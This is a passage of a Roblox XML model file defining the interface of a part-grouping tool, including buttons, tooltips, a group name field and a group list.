												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>40</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">false</bool>
												<int name="ZIndex">2</int>
											</Properties>
											<Item class="Frame" referent="RBX5E54E6604E6C4913B5CDFC3153B9EA38">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Tip</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>1</XS>
														<XO>-6</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<float name="Rotation">45</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>12</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX9D9C1650F0154FC7B14F55718C46000F">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">2</token>
													<string name="Name">Text</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>4</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">RENAME</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">10</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">3</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="ImageButton" referent="RBXB4D933305426417787620B29F0C96806">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=160408836</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0.25</float>
											<bool name="Modal">false</bool>
											<string name="Name">IgnoreButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>1</XS>
												<XO>-25</XO>
												<YS>0</YS>
												<YO>5</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>16</XO>
												<YS>0</YS>
												<YO>16</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBXFF6E5C5050CF4CB0BE5C125345A6AEB4">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">RightTooltip</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>-58</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>48</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">false</bool>
												<int name="ZIndex">2</int>
											</Properties>
											<Item class="Frame" referent="RBXF1D6FE8F408F48C691B80F2FAE240D7A">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Tip</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>1</XS>
														<XO>-6</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<float name="Rotation">45</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>12</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBXCBD35AB932834BD59A9CC8921F9F569E">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">2</token>
													<string name="Name">Text</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>4</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">UNIGNORE</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">10</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">3</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="ImageButton" referent="RBXF55585B45A6B4545835BBAEF5AFDE8E0">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=160402908</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0.25</float>
											<bool name="Modal">false</bool>
											<string name="Name">UpdateButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>12</XO>
												<YS>0</YS>
												<YO>5</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>16</XO>
												<YS>0</YS>
												<YO>16</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBXC7D66330C0514945BBD53ED60C091A30">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">LeftTooltip</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>1</XS>
													<XO>12</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">false</bool>
												<int name="ZIndex">3</int>
											</Properties>
											<Item class="Frame" referent="RBX6E6B73490CD940619337E1077D1ABD42">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Tip</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>-6</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<float name="Rotation">45</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>12</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">3</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX24605FDC8AF14FE285B2B336848556D2">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">2</token>
													<string name="Name">Text</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>-4</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>4</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">UPDATE</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">10</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">3</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX2FBBFF08C2584E3E84059B484D17614B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">GroupNameArea</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>35</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>90</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX29F84EDE49344168A911B32670464BB6">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">LeftTooltip</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>1</XS>
													<XO>12</XO>
													<YS>0</YS>
													<YO>5</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">false</bool>
												<int name="ZIndex">2</int>
											</Properties>
											<Item class="Frame" referent="RBX9CBD11D610174B33BC0B6D66DD976E34">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Tip</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>-6</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<float name="Rotation">45</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>12</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBXB9CCE0C9626448FBB990ADE89C4A8B8C">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">2</token>
													<string name="Name">Text</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>-4</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>4</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">SELECT</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">10</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">3</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="TextButton" referent="RBX70385DBD0C7C4A4086DFF8DB2B3B4F62">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">true</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="Modal">false</bool>
											<string name="Name">GroupName</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>35</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>90</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text">Group 1</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">0</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX16A90F0E909C4A08BE35925F8100551B">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">true</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">GroupNamer</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>35</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>90</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Group 1</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">0</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">false</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="ScrollingFrame" referent="RBX9186B67E289E4945ABC179FF11397AB7">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<Content name="BottomImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
									<Vector2 name="CanvasPosition">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<UDim2 name="CanvasSize">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<bool name="ClipsDescendants">true</bool>
									<bool name="Draggable">false</bool>
									<Content name="MidImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
									<string name="Name">GroupList</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<int name="ScrollBarThickness">3</int>
									<bool name="ScrollingEnabled">true</bool>
									<bool name="Selectable">true</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>70</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<Content name="TopImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextLabel" referent="RBX39121BDB3A2D4AFBAA6B011FDA3F7264">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">SelectNote</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>27</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Select something to use this tool.</string>
									<Color3 name="TextColor3">4294967295</Color3>
									<bool name="TextScaled">true</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">0.5</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">true</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="Frame" referent="RBX6E871B5A5C434438BD1EC4EF62F5CFDC">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextButton" referent="RBX6DCC530700AF479DBF65BA987B0BD6C5">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4281940281</Color3>
										<float name="BackgroundTransparency">0.5</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">CreateButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>1</XS>
											<XO>-40</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>40</XO>
											<YS>0</YS>
											<YO>16</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">NEW</string>
										<Color3 name="TextColor3">4294967295</Color3>
